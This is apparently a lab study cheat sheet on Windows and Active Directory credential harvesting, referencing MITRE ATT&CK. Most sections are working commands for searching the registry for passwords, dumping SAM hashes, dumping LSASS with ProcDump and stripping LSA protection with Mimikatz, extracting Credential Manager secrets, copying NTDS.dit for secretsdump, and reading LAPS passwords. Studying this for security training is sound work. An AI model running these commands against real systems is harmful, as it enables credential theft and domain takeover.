## 🪝 Credentials Harvesting

Attackers search compromised machines for credentials in local or remote file systems. Clear-text files often contain sensitive user data, passwords, or private keys. The MITRE ATT&CK framework defines this as Unsecured Credentials: Credentials In Files (T1552.001).

Target file types include:
* Command history
* Configuration files (Web App, FTP, etc.)
* Windows Application files (Browsers, Email Clients, etc.)
* Backup files
* Shared files and folders
* Source code

PowerShell saves command history in the user profile: `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

The Windows Registry can also be queried for sensitive keywords.

```cmd
# Search for the "password" keyword in the HKLM and HKCU Registry hives
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
* Tool: Windows Command Prompt (reg.exe)

## 🔐 Password Managers

Password managers store and manage login information. If misconfigured or vulnerable, adversaries can extract stored sensitive data during enumeration.

Examples include:
* Built-in Windows password managers
* Third-party applications (KeePass, 1Password, LastPass)

## 🧠 Memory Dump

Operating system memory contains sensitive data loaded at runtime. Access typically requires administrator privileges.

Sensitive data stored in memory includes:
* Clear-text credentials
* Cached passwords
* Active Directory (AD) Tickets

## 🏢 Active Directory

Active Directory stores extensive user, group, and computer object data. Misconfigurations often lead to credential exposure.



Common misconfigurations:
* Users' description: Administrators occasionally store initial passwords in the description field.
* Group Policy SYSVOL: Leaked encryption keys can grant access to administrator accounts.
* NTDS: Contains AD users' credentials.
* AD Attacks: Structural misconfigurations allow for complex attack chains.

## 📡 Network Sniffing

Initial access allows attackers to perform network-level attacks against the AD environment.



Man-In-the-Middle (MitM) attacks against network protocols allow attackers to spoof trusted resources and capture authentication data, such as NTLM hashes.

## 🖥️ Local Windows Credentials

### Metasploit HashDump
Metasploit uses in-memory code injection into the LSASS.exe process to copy the SAM database hashes.

```bash
# Dump SAM database hashes using Metasploit meterpreter
getuid
hashdump
```
* Tool: Metasploit Framework

### Volume Shadow Copy Service
The Microsoft Volume Shadow Copy Service creates backups of volumes while in use. It requires administrator privileges.

```cmd
# Create a Volume Shadow Copy of the C: drive using WMIC
wmic shadowcopy call create Volume='C:\'
```
* Tool: WMIC (Windows Management Instrumentation Command-line)

```cmd
# List available Volume Shadow Copies
vssadmin list shadows
```
* Tool: Vssadmin

To decrypt the SAM database, the SYSTEM registry key is required. Both can be extracted from the shadow copy.

```cmd
# Copy the SAM and SYSTEM registry hives from the Volume Shadow Copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
* Tool: Windows Command Prompt

### Registry Hives
The Windows Registry stores a copy of SAM database contents. Administrator privileges are required to save the hives directly.

```cmd
# Save the SAM and SYSTEM registry hives directly to disk
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
* Tool: Windows Command Prompt (reg.exe)

```bash
# Decrypt the SAM database offline using Impacket secretsdump
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```
* Tool: Impacket (secretsdump.py)

## 🛡️ LSASS Credential Dumping

Local Security Authority Server Service (LSASS) enforces security policy, verifies logins, and caches passwords, hashes, and Kerberos tickets. Dumping LSASS memory requires administrator privileges (MITRE ATT&CK T1003).



### Sysinternals Suite
ProcDump can create a memory dump of the LSASS process from the command line.

```cmd
# Dump the LSASS process memory to a file using ProcDump
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump.dmp
```
* Tool: Sysinternals ProcDump

### Protected LSASS
LSA Protection prevents unauthorized access to LSASS memory. It is enabled via the `RunAsPPL` registry DWORD. If enabled, standard Mimikatz commands will fail.

```bash
# Attempt to dump passwords (fails with Access Denied if LSA protection is enabled)
sekurlsa::logonpasswords
```
* Tool: Mimikatz

Mimikatz provides the `mimidrv.sys` kernel driver to bypass this protection.

```bash
# Load the mimidrv kernel driver into memory
!+
```
* Tool: Mimikatz

```bash
# Remove LSA protection from the LSASS process using the loaded driver
!processprotect /process:lsass.exe /remove
```
* Tool: Mimikatz

## 🗄️ Windows Credential Manager

Credential Manager stores sensitive authentication data categorized into Web, Windows, Generic, and Certificate-based credentials.

```cmd
# List all available Windows vaults
vaultcmd /list
```
* Tool: Windows VaultCmd

```cmd
# Check for stored credentials within the "Web Credentials" vault
VaultCmd /listproperties:"Web Credentials"
```
* Tool: Windows VaultCmd

```cmd
# List detailed credential information for the "Web Credentials" vault
VaultCmd /listcreds:"Web Credentials"
```
* Tool: Windows VaultCmd

VaultCmd cannot display clear-text passwords. Custom PowerShell scripts are required to extract the plaintext values.

```powershell
# Execute PowerShell script to extract clear-text Web Credentials
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```
* Tool: PowerShell (Get-WebCredentials.ps1)

## 🗃️ NTDS Database Extraction

New Technologies Directory Services (NTDS) contains Active Directory objects, attributes, and credentials. The database (`ntds.dit`) is locked during runtime. 



Required files for offline extraction:
* `C:\Windows\NTDS\ntds.dit`
* `C:\Windows\System32\config\SYSTEM`
* `C:\Windows\System32\config\SECURITY`

```powershell
# Extract the NTDS.dit database, SYSTEM, and SECURITY hives using ntdsutil
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
```
* Tool: Windows Ntdsutil

```bash
# Extract AD hashes from the dumped NTDS.dit offline
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```
* Tool: Impacket (secretsdump.py)

## 🔑 Local Administrator Password Solution (LAPS)

LAPS secures local administrator passwords by storing them as clear-text attributes (`ms-mcs-AdmPwd`) on computer objects in AD, rotated based on `ms-mcs-AdmPwdExpirationTime`.

```cmd
# Check if the LAPS Client Side Extension (CSE) is installed
dir "C:\Program Files\LAPS\CSE"
```
* Tool: Windows Command Prompt

```powershell
# List available LAPS PowerShell cmdlets
Get-Command *AdmPwd*
```
* Tool: PowerShell

```powershell
# Identify AD Organizational Units with LAPS extended rights
Find-AdmPwdExtendedRights -Identity THMorg
```
* Tool: PowerShell (AdmPwd)

```cmd
# Check members of the authorized LAPS group
net groups "THMGroupReader" /domain
```
* Tool: Windows Command Prompt (net.exe)

If an attacker compromises an account within the authorized group, they can retrieve the machine's local administrator password.

```powershell
# Retrieve the LAPS clear-text local administrator password for a specific machine
Get-AdmPwdPassword -ComputerName creds-harvestin
```
* Tool: PowerShell (AdmPwd)
